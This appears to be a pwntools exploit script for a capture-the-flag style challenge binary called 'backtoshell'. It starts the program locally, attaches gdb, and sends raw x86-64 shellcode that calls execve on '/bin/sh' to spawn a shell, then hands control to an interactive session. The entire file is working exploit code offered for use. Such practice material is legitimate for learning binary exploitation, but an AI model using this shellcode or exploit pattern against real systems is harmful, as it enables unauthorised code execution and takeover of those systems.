from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

r = process("./backtoshell")
gdb.attach(r)
input("wait")


r.send(b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00")
r.interactive()
